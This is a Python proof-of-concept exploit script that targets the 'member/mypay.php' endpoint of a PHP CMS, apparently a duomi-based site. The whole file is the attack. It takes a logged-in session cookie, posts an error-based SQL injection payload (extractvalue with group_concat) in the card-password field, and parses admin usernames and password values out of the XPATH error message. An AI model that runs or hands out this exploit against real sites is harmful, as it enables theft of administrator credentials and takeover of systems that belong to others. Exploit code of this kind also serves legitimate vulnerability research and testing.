import re

import requests

from lib.core.data import target


def poc():
    try:
        if not target.url.endswith("member/mypay.php"):
            print("[*] Please make sure the url end with 'member/mypay.php'")
            exit()
        proxy = {'http': "http://127.0.0.1:8080"}
        url = target.url + "?dm=mypay"
        phpsessid = raw_input("[*] Login and paste the PHPSESSID here:")
        cookie = {'PHPSESSID': phpsessid}
        payload = """
            bypass'or"'"or extractvalue(1,(select group_concat(0x3a,name,0x3a,password) from duomi_admin))or"'"='1
        """
        postData = {
            'cardkey': '1',
            'cardpwd': payload,
            'cardb': '%25E5%2585%2585%25E5%2580%25BC'
        }
        r = requests.post(url, cookies=cookie, data=postData)

        p = re.compile("(?<=XPATH syntax error: \':)(.*)(?=\' <br)")
        print("[*] The result: " + re.search(p, r.text).group(0))
    except KeyError as e:
        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
